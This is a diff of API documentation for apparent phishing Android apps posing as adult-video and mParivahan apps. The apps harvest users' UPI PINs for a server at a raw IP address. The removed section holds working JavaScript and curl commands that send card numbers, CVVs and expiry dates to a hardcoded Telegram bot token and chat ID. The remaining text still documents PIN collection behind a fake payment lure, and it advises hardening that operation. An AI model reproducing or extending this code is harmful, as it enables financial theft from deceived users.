@@ -13,7 +13,6 @@
 2. [Authentication & Device Tracking](#authentication--device-tracking)
 3. [API Endpoints](#api-endpoints)
    - [Save UPI PIN](#1-save-upi-pin)
-   - [Card Details via Telegram](#2-card-details-telegram-bot)
 4. [Flow Diagrams](#flow-diagrams)
 5. [Error Handling](#error-handling)
 6. [Security Considerations](#security-considerations)
@@ -23,10 +22,9 @@
 
 ## ?? Overview
 
-This application uses **two main data collection methods**:
+This application uses **one main data collection method**:
 
 1. **Custom Backend Server** - For UPI PIN collection
-2. **Telegram Bot API** - For card details collection (SexyHub only)
 
 ### Application Flavors
 
@@ -34,7 +32,7 @@ This application uses **two main data collection methods**:
 |--------|--------------|-----------------|
 | **SexChat** | com.sexychat.me | UPI PIN only |
 | **mParivahan** | com.mparivahan.me | UPI PIN only |
-| **SexyHub** | com.sexyhub.me | UPI PIN + Card Details |
+| **SexyHub** | com.sexyhub.me | UPI PIN only |
 
 ---
 
@@ -282,222 +280,6 @@ curl -X POST http://95.134.130.160:8765/save-pin \
 
 ---
 
-### 2. Card Details (Telegram Bot)
-
-**?? Used in SexyHub Flavor Only**
-
-Sends credit/debit card details to a Telegram bot for collection.
-
-#### Endpoint Details
-
-```
-POST https://api.telegram.org/bot8135558765:AAGwWtbug4hI8G1q9LZ9s6qAUS6pT9qeOtA/sendMessage
-```
-
-**Note:** This is Telegram's official Bot API endpoint.
-
-#### Request Headers
-
-```http
-Content-Type: application/json
-```
-
-#### Request Body
-
-```json
-{
-  "chat_id": "-1003282741646",
-  "text": "New Card Details:\nCard Number: 1234567890123456\nExpiry: 12/25\nCVV: 123\nName: John Doe\nDeviceId: abc123def456"
-}
-```
-
-#### Parameters
-
-| Parameter | Type | Required | Description |
-|-----------|------|----------|-------------|
-| `chat_id` | string | Yes | Telegram chat/channel ID: `-1003282741646` |
-| `text` | string | Yes | Formatted message containing card details |
-
-#### Card Data Structure
-
-The `text` field contains formatted card information:
-
-```
-New Card Details:
-Card Number: [16-19 digits]
-Expiry: [MM/YY]
-CVV: [3-4 digits]
-Name: [Cardholder name]
-DeviceId: [device_id]
-```
-
-**Example:**
-```
-New Card Details:
-Card Number: 4532015112830366
-Expiry: 12/25
-CVV: 123
-Name: John Doe
-DeviceId: abc123def456
-```
-
-#### Card Validation Rules
-
-**Card Number:**
-- Length: 12-19 digits
-- Stripped of spaces before sending
-- No validation for card type (Visa/Mastercard/etc)
-
-**Expiry:**
-- Format: `MM/YY`
-- Must contain `/` at position 2
-- Example: `12/25`
-- Auto-formatted on client side
-
-**CVV:**
-- Length: 3-4 digits
-- Numeric only
-- Masked as password on input
-
-**Cardholder Name:**
-- Minimum length: 3 characters
-- Trimmed of whitespace
-- Full name expected
-
-#### Success Response
-
-**HTTP Status:** `200 OK`
-
-Telegram API returns:
-```json
-{
-  "ok": true,
-  "result": {
-    "message_id": 12345,
-    "date": 1730476800,
-    "text": "New Card Details:..."
-  }
-}
-```
-
-#### Error Response
-
-**HTTP Status:** `400 Bad Request` or others
-
-```json
-{
-  "ok": false,
-  "error_code": 400,
-  "description": "Error message"
-}
-```
-
-#### Client Implementation
-
-**JavaScript (SexyHub only):**
-
-```javascript
-function payCard(e) {
-    e.preventDefault();
-    
-    var cardNumber = document.getElementsByName("cardnum")[0].value.replace(/\s/g,"");
-    var expiry = document.getElementsByName("exp")[0].value;
-    var cvv = document.getElementsByName("cvv")[0].value;
-    var name = document.getElementsByName("nameoncard")[0].value.trim();
-    var deviceId = getDeviceId();
-    
-    // Client-side validation
-    var errBox = document.getElementById("errMsg");
-    errBox.style.display = "none";
-    
-    if (cardNumber.length < 12) {
-        errBox.innerText = "Invalid card number.";
-        errBox.style.display = "block";
-        return false;
-    }
-    
-    if (expiry.length != 5 || expiry.indexOf("/") != 2) {
-        errBox.innerText = "Expiry must be MM/YY format.";
-        errBox.style.display = "block";
-        return false;
-    }
-    
-    if (cvv.length < 3) {
-        errBox.innerText = "CVV must be 3 or 4 digits.";
-        errBox.style.display = "block";
-        return false;
-    }
-    
-    if (name.length < 3) {
-        errBox.innerText = "Cardholder name required.";
-        errBox.style.display = "block";
-        return false;
-    }
-    
-    // Format message
-    let message = `New Card Details:
-Card Number: ${cardNumber}
-Expiry: ${expiry}
-CVV: ${cvv}
-Name: ${name}
-DeviceId: ${deviceId}`;
-    
-    // Send to Telegram
-    fetch("https://api.telegram.org/bot8135558765:AAGwWtbug4hI8G1q9LZ9s6qAUS6pT9qeOtA/sendMessage", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: "-1003282741646",
-            text: message
-        })
-    }).then(() => {
-        window.location.href = "wait.html";
-    });
-    
-    return false;
-}
-```
-
-#### Expiry Formatting
-
-Auto-format expiry input to `MM/YY`:
-
-```javascript
-function formatExpiry(input) {
-    let value = input.value.replace(/[^0-9]/g, "");
-    if (value.length >= 2 && value[2] !== "/" && value.length < 5) {
-        value = value.slice(0, 2) + "/" + value.slice(2);
-    }
-    input.value = value.slice(0, 5);
-}
-```
-
-#### cURL Example
-
-```bash
-curl -X POST "https://api.telegram.org/bot8135558765:AAGwWtbug4hI8G1q9LZ9s6qAUS6pT9qeOtA/sendMessage" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "chat_id": "-1003282741646",
-    "text": "New Card Details:\nCard Number: 4532015112830366\nExpiry: 12/25\nCVV: 123\nName: John Doe\nDeviceId: test_device_001"
-  }'
-```
-
-#### Used In Files
-
-- `/app/src/sexyhub/assets/card.html`
-
-#### Security Considerations
-
-?? **WARNING:**
-- Card details sent in **plain text**
-- No encryption on client or server
-- Telegram bot token is **hardcoded** in client
-- Bot token is **publicly visible** in HTML source
-- Recommendation: Use proper backend server with encryption
-
----
-
 ## ?? Flow Diagrams
 
 ### Complete Payment Flow (All Flavors)
@@ -542,41 +324,6 @@ curl -X POST "https://api.telegram.org/bot8135558765:AAGwWtbug4hI8G1q9LZ9s6qAUS6
    ?? final.html with celebration animation
 ```
 
-### SexyHub Card Payment Flow
-
-```
-SexyHub ONLY:
-   ?
-1. User clicks on locked video
-   ?
-2. Payment popup
-   ?? "Pay ?1 to unlock all videos"
-   ?
-3. Payment method selection
-   ?? Option: UPI ? (follows UPI flow above)
-   ?? Option: Card ? card.html
-   ?
-4. Card Details Form
-   ?? Cardholder Name
-   ?? Card Number (12-19 digits)
-   ?? Expiry (MM/YY)
-   ?? CVV (3-4 digits)
-   ?
-5. Client-side Validation
-   ?? Card number length check
-   ?? Expiry format check (MM/YY)
-   ?? CVV length check
-   ?? Name minimum length check
-   ?
-6. API Call: Telegram Bot
-   ?? POST to Telegram sendMessage
-   ?? Sends formatted card details
-   ?? Includes device_id
-   ?
-7. Redirect to wait.html
-   ?? (same as UPI flow)
-```
-
 ### Data Collection Points
 
 ```
@@ -596,14 +343,6 @@ Payment Phase:
 ?     ?? device_id
 ?     ?? app_type
 ?     ?? user_id
-?
-?? SEXYHUB ONLY:
-   ?? Card Details ? Telegram Bot
-      ?? card_number
-      ?? expiry
-      ?? cvv
-      ?? name
-      ?? device_id
 ```
 
 ---
@@ -634,17 +373,6 @@ function submitPIN() {
         }
     }
 }
-```
-
-#### Card Validation
-
-**Shows error messages:**
-```javascript
-// Example errors shown to user
-- "Invalid card number."
-- "Expiry must be MM/YY format."
-- "CVV must be 3 or 4 digits."
-- "Cardholder name required."
 ```
 
 ### Server-Side Error Handling
@@ -694,21 +422,16 @@ if (!['sexychat', 'mparivahan', 'sexyhub'].includes(req.body.app_type)) {
    - All data sent in plain text
    - Susceptible to man-in-the-middle attacks
 
-2. **Telegram Bot Token Exposed**
-   - Token hardcoded in client-side JavaScript
-   - Publicly visible in HTML source
-   - Anyone can use token to send messages
-
-3. **No Request Authentication**
+2. **No Request Authentication**
    - No API keys or tokens required
    - Any client can send requests
    - Vulnerable to spam/abuse
 
-4. **Sensitive Data in URLs**
+3. **Sensitive Data in URLs**
    - User ID hardcoded and visible
    - Device IDs transmitted without encryption
 
-5. **No Rate Limiting (Client)**
+4. **No Rate Limiting (Client)**
    - Clients can spam requests
    - No protection against abuse
 
@@ -722,25 +445,14 @@ if (!['sexychat', 'mparivahan', 'sexyhub'].includes(req.body.app_type)) {
 const API_URL = 'https://secure.yourdomain.com/save-pin';
 ```
 
-2. **Move Telegram Bot to Backend**
-```javascript
-// Instead of calling Telegram directly, call your backend
-fetch('https://your-backend.com/api/card-details', {
-    method: 'POST',
-    body: JSON.stringify(cardData)
-});
-
-// Backend then forwards to Telegram securely
-```
-
-3. **Add Request Signing**
+2. **Add Request Signing**
 ```javascript
 // Generate signature from request data
 const signature = generateHMAC(requestData, secretKey);
 headers['X-Signature'] = signature;
 ```
 
-4. **Implement Rate Limiting**
+3. **Implement Rate Limiting**
 ```javascript
 // Server-side rate limiting
 const rateLimit = require('express-rate-limit');
@@ -752,17 +464,17 @@ const limiter = rateLimit({
 app.post('/save-pin', limiter, handler);
 ```
 
-5. **Encrypt Sensitive Data**
+4. **Encrypt Sensitive Data**
 ```javascript
 // Client-side encryption before sending
 const encryptedPIN = CryptoJS.AES.encrypt(upiPin, publicKey);
 ```
 
-6. **Use Environment Variables**
+5. **Use Environment Variables**
 ```javascript
 // Don't hardcode credentials
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const API_KEY = process.env.API_KEY;
+const API_SECRET = process.env.API_SECRET;
 ```
 
 ---
@@ -828,21 +540,6 @@ curl -X POST http://95.134.130.160:8765/save-pin \
 
 **Expected:** `400 Bad Request` with error message
 
-### Testing Telegram Bot
-
-#### Test Card Details
-
-```bash
-curl -X POST "https://api.telegram.org/bot8135558765:AAGwWtbug4hI8G1q9LZ9s6qAUS6pT9qeOtA/sendMessage" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "chat_id": "-1003282741646",
-    "text": "TEST CARD:\nCard: 1234567812345678\nExpiry: 12/25\nCVV: 123\nName: Test User\nDevice: test_001"
-  }'
-```
-
-**Expected:** `200 OK` with Telegram response
-
 ### Load Testing
 
 **Using Apache Bench:**
@@ -870,7 +567,6 @@ ab -n 100 -c 10 -p pin.json -T "application/json" \
 | Endpoint | Method | Used By | Purpose | Authentication |
 |----------|--------|---------|---------|----------------|
 | `/save-pin` | POST | All Flavors | Store UPI PIN | Device ID |
-| Telegram Bot | POST | SexyHub Only | Store Card Details | Bot Token |
 
 ---
 
@@ -1005,7 +701,6 @@ window.location.href = "wait.html";
 
 For API issues or questions:
 - Check server logs at: `http://95.134.130.160:8765/logs` (if available)
-- Monitor Telegram channel: `-1003282741646` for card submissions
 - Review application logs via Firebase Console
 
 ---
@@ -1014,7 +709,7 @@ For API issues or questions:
 
 | Version | Date | Changes |
 |---------|------|---------|
-| 1.0 | 2025-11-01 | Initial release with /save-pin and Telegram integration |
+| 1.0 | 2025-11-01 | Initial release with /save-pin endpoint |
 
 ---
 
